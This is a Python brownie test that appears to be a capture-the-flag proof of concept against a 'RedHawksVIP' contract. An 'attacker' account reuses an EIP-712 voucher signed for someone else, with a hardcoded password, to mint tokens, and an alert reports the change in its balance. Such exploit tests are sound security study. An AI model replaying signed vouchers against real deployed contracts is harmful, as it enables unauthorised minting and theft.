from eip712.messages import *
from brownie.network.alert import Alert
from brownie import accounts, RedHawksVIP, chain
def test_classSig():


    dep = accounts.add()
    attacker = accounts.add()
    vouchersSigner = accounts.add()

    test = RedHawksVIP.deploy(vouchersSigner.address, {'from': dep})

    class VoucherData(EIP712Message):
        _chainId_: "uint256" = chain.id
        _verifyingContract_: "address" = test.address
        amountOfTickets: "uint256"
        password: "string"


    msg = VoucherData(amountOfTickets=2, password="RedHawksRulzzz133")

    signed = vouchersSigner.sign_message(msg)

    def tokenBal(): return test.balanceOf(attacker.address)
    Alert(tokenBal, msg="Attacker tokens balance has changed from {} to {}")

    test.mint(2, "RedHawksRulzzz133", signed.signature.hex(), {'from': attacker.address})
